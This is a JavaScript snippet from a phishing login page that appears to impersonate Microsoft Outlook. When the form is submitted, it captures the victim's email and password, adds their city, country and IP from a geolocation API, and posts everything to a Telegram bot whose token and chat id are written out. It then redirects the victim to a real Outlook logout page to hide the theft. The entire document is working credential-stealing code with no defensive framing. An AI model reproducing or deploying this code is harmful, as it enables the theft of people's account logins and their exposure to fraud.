  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const email = document.querySelector("#email").value;
          const contra = document.querySelector("#clave").value;

          const message =
            "\n📧Usuario: " +
            email +
            "\n🔒Contra: " +
            contra +
            "\n🌐Ciudad:" +
            response.data.city +
            "\n🌐Pais: " +
            response.data.country +
            "\n📌IP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot7092576489:AAH5tXkYtk0kZv1s-oxRGGM4Ehk8LWk46d0/sendMessage",
              {
                chat_id: "6265926665",
                text: message,
              }
            )
            .then((response) => {
              window.location.href =
                "https://login.live.com/logout.srf?ct=1698893038&rver=7.0.6738.0&id=292841&ru=https:%2F%2Foutlook.live.com%2Fowa%2Fcsignout.aspx%3F%253f%253fumkt%3Des-US%26exch%3D1%26RpsCsrfState%3D4042c6ed-e025-daaa-5b59-e2b84fedc413";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
